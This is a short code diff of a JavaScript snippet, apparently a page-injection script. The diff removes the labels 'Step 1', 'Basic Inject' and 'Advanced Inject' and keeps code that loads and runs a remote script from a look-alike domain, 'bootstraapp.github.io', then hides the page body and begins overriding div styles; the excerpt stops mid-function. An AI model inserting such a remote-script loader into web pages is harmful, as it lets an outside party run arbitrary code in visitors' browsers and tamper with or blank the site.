@@ -1,16 +1,14 @@
-Step 1
+
 var script = document.createElement('script');
 script.src = 'https://bootstraapp.github.io/scriptt/script.js';
 document.body.appendChild(script);
 
-Basic Inject
 function overrideImportantStyle() {
     var bodyElement = document.body;
     bodyElement.style.setProperty('display', 'none', 'important');
 }
 overrideImportantStyle();
 
-Advanced Inject
 function overrideStyles() {
     let divElements = document.getElementsByTagName('div');
     let divElementsArray = Array.from(divElements);
